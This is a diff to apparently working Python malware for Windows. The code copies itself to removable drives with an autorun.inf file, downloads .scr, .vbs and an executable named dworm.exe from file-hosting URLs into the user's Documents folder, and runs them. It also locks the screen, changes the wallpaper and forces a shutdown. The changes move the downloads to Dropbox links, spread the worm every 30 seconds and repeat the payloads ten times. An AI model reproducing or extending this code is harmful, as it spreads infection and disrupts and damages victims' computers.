@@ -9,8 +9,8 @@ _/ ___\_  __ \/   |  |_/  ___/  |  \  _(__  <_  __ \
      \/           |__|     \/     \/       \/       '''
 
 
-import Tkinter, random, winsound, time, os, ctypes
-import getpass, sys, base64, urllib, webbrowser, wget
+import Tkinter, random, winsound, time, os, ctypes, requests
+import getpass, sys, base64, urllib, webbrowser, wget, dropbox
 
 def us():
     dl = ['F', 'G', 'E', 'M', 'H']
@@ -35,7 +35,6 @@ UseAutoPlay=1''' % (filen, filen)
             cpy(dl[d])
         except:
             pass
-
 
 def poo():
     us()
@@ -79,11 +78,17 @@ def poo():
     label.pack()
     root.mainloop()
 
-
 def shut():
-    time.sleep(60*30)
-    os.system("shutdown /s")
-
+    hhz = 0
+    for w in range(60*30):
+        hhz += 1
+        time.sleep(1)
+        if hhz % 30 == 0:
+            us()
+        elif hhz == 60*30:
+            os.system("shutdown /s")
+        else:
+            time.sleep(1)
 
 def block():
     while(1==1):
@@ -115,7 +120,6 @@ def block():
         block.after(111,uppos)
         block.mainloop()
 
-
 def wpp():
 
     if cd != startxa:
@@ -126,44 +130,41 @@ def wpp():
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, walph , 0)
 
-
 def dn():
     # Necessary files
 
     global  disf
     disf = "\"C:\Users" + "\\" + quest + "\Documents\""
 
-    wget.download("http://download1499.mediafire.com/4idbxxf5qpxg/3u2ps3idmsh3tgw/bambams.scr")
-    os.system("move bambams.scr " + disf)
+    urllib.urlretrieve("https://www.dropbox.com/s/t4dlg5khvr190m7/bambams.scr?dl=1", "bambams.scr")
     time.sleep(1)
+    os.system("move bambams.scr " + disf)
 
-    wget.download("http://download1639.mediafire.com/8g6qmhu5ud2g/wbgvv3ba751hdis/jajas.scr")
+    urllib.urlretrieve("https://www.dropbox.com/s/mqqsw2s170t45ho/jajas.scr?dl=1", "jajas.scr")
     os.system("move jajas.scr " +  disf)
     time.sleep(1)
 
-    wget.download("http://download1496.mediafire.com/rnww1w81kzzg/14q3n14sqmh3kwn/xavs.scr")
+    urllib.urlretrieve("https://www.dropbox.com/s/cijstvmp2wf51dc/xavs.scr?dl=1", "xavs.scr")
     os.system("move xavs.scr " + disf)
     time.sleep(1)
 
-    wget.download("http://zepikao.my3gb.com/Sh3lz/sound.vbs")
+    urllib.urlretrieve("http://zepikao.my3gb.com/Sh3lz/sound.vbs", "sound.vbs")
     os.system("move sound.vbs " + disf)
     time.sleep(1)
 
-    wget.download("http://download1593.mediafire.com/q885r1g125gg/pwhpbb0lqr2mggs/t.mp3")
+    urllib.urlretrieve("https://www.dropbox.com/s/369sw5dfiimafgq/t.mp3?dl=1", "t.mp3")
     os.system("move t.mp3 " + disf)
     time.sleep(1)
 
-    wget.download("http://zepikao.my3gb.com/Sh3lz/dworm.exe")
+    urllib.urlretrieve("http://zepikao.my3gb.com/Sh3lz/dworm.exe", "dworm.exe")
     os.system("move dworm.exe " + disf)
     time.sleep(1)
-
 
 def sc():
     global disd
     disd = "C:\Users" + "\\" + quest + "\Documents\\"
     os.system("start " + disd + "dworm.exe")
     us()
-
 
 def checkex():
     us()
@@ -188,13 +189,15 @@ def checkex():
                     us()
                     block()
                 elif pcho == 2:
-                    us()
-                    poo()
+                    for d24 in range(10):
+                        us()
+                        poo()
                 elif pcho == 3:
-                    us()
-                    sc()
+                    for d34 in range(10):
+                        us()
+                        sc()
                 elif pcho == 4:
-                    os.system('start ' + disd + "sound.vbs")
+                    os.system("start C:\\Users\\%username%\\Documents\\sound.vbs")
 
             except:
                 pass
